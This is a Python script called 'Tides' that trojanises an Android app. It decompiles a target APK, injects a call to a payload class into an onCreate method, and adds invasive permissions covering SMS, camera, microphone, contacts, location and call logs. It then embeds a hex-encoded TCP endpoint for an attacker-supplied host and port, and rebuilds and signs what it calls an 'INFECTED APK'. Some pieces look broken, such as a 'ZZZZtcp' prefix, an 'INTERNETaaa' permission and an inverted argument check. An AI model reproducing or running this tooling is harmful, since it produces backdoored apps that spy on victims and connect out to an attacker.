#Tides
import subprocess
import sys
import os

def initialize():
	global cwd
	cwd = os.getcwd()
	global targetAPK
	targetAPK = sys.argv[1]
	global decompileDir
	decompileDir = targetAPK.split("/")[-1].split(".")[0] + "/"
	HOST = sys.argv[2]
	PORT = sys.argv[3]
	global endPoint
	endPoint = f"ZZZZtcp://{HOST}:{PORT}"

def decompile():
	print("[*] DECOMPILING TARGET APK...")
	command = ["apktool", "d", "-f", targetAPK, "--use-aapt2"]
	p = subprocess.Popen(command, stdout=subprocess.PIPE)
	result = p.communicate()[0]
	if b"error" in result:
		print("[+] APKTOOL DECOMPILE ERROR: ",result.decode())
	else:
		print("[+] APKTOOL DECOMPILED SUCCESS")

def findSmaliToInject():
	global smaliToInject
	if not sys.argv[3]:
		smaliToInject = sys.argv[3]
	else:
		print("[+] Finding path to inject ... ")
		print("#####################################")
		for root, dirs, files in os.walk(decompileDir + "smali/", topdown=False):
			for name in files:
				path = os.path.join(root, name)
				with open(path, "r") as f:
					contents = f.readlines()
					for count, line in enumerate(contents):
						if all(x in line.lower() for x in ["create", "method"]):
							if not ".end method" in contents[count + 1]:
								print(path)
		print("#####################################")	
		smaliToInject = input("Input path you want inject: ")
		

def invokePayload():
	global smaliToInjectDir
	smaliToInjectDir = smaliToInject[smaliToInject.find("smali/") + 6:smaliToInject.rfind("/")]
	payload = f'\n\tinvoke-static {{p0}}, L{smaliToInjectDir}/AssistActivity;->doThis(Landroid/content/Context;)V\n'
	#NOW WE NEED TO INJECT THE CALLING CODE INTO THE TARGET ACTIVITY
	with open(smaliToInject, "r") as f:
		contents = f.readlines()

	for count, line in enumerate(contents):
		if all(x in line.lower() for x in ["create", "method"]):
			contents[count] = line + payload
			break

	with open(smaliToInject, "w") as f:
		contents = "".join(contents)
		f.write(contents)

def injectPermission():
	crazyPermission = """
	<uses-permission android:name="android.permission.INTERNETaaa"/>
	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
	<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
	<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION"/>
	<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
	<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
	<uses-permission android:name="android.permission.SEND_SMS"/>
	<uses-permission android:name="android.permission.RECEIVE_SMS"/>
	<uses-permission android:name="android.permission.RECORD_AUDIO"/>
	<uses-permission android:name="android.permission.CALL_PHONE"/>
	<uses-permission android:name="android.permission.READ_CONTACTS"/>
	<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
	<uses-permission android:name="android.permission.RECORD_AUDIO"/>
	<uses-permission android:name="android.permission.WRITE_SETTINGS"/>
	<uses-permission android:name="android.permission.CAMERA"/>
	<uses-permission android:name="android.permission.READ_SMS"/>
	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
	<uses-permission android:name="android.permission.SET_WALLPAPER"/>
	<uses-permission android:name="android.permission.READ_CALL_LOG"/>
	<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
	<uses-feature android:name="android.hardware.camera"/>
	<uses-feature android:name="android.hardware.camera.autofocus"/>
	<uses-feature android:name="android.hardware.microphone"/>
"""

	with open(decompileDir + "AndroidManifest.xml", "r") as f:
		contents = f.readlines()
		
	for count, line in enumerate(contents):
		if "uses-permission android:name" in line:
			contents[count] = line + crazyPermission
			break

	with open(decompileDir + "AndroidManifest.xml", "w") as f:
		contents = "".join(contents)
		f.write(contents)

def buildPayload():
	payloadPath1 = "payload/AssistActivity1.smali"
	payloadPath2 = "payload/AssistActivity.smali"
	payload1 = open(payloadPath1).read()
	payload2 = open(payloadPath2).read()

	payload1 = payload1.replace('PLACEHOLDER',f'L{smaliToInjectDir}')
	payload2 = payload2.replace('PLACEHOLDER',f'L{smaliToInjectDir}')

	payload2 = payload2.replace('FACEPALM',hex(len(endPoint)))
	hexEndPoint = "\n\t\t".join(map(lambda x : hex(ord(x)), endPoint))
	payload2= payload2.replace('BEARDEDGREATNESS',hexEndPoint)

	with open(smaliToInject[:smaliToInject.rfind("/")] + "/AssistActivity1.smali", "w") as f:
		f.write(payload1)

	with open(smaliToInject[:smaliToInject.rfind("/")] + "/AssistActivity.smali", "w") as f:
		f.write(payload2)


def recompile():
	print("[+] TIME TO BUILD INFECTED APK...")
	newApkPath = decompileDir + "dist/" + targetAPK
	# build
	commandToBuild = ["apktool","b", decompileDir, "--use-aapt2"]
	print("[*] EXECUTING APKTOOL BUILD COMMAND...")
	p = subprocess.Popen(commandToBuild, stdout=subprocess.PIPE)
	buildResult = p.communicate()[0]
	if b"error" in buildResult:
		print("[+] APKTOOL BUILD ERROR: ",buildResult.decode())
	else:
		print("[+] APKTOOL BUILD SUCCESS")
	# sign
	jarSignerCommand = ["jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", 
						"SHA1", "-keystore", "tides.keystore", newApkPath, "tides"]
	print("[*] EXECUTING JARSIGNER COMMAND...")
	p = subprocess.Popen(jarSignerCommand, stdout=subprocess.PIPE)
	jarsignerResult = p.communicate()[0]
	if b"error" in jarsignerResult:
		print("[+] JARSIGNER ERROR: ",buildResult.decode())
	else:
		print("[+] JARSIGNER SUCCESS")

	print("\n[+] New target apk located at "+ newApkPath)


if __name__ == "__main__":
	initialize()
	decompile()
	findSmaliToInject()
	injectPermission()
	invokePayload()
	buildPayload()
	recompile()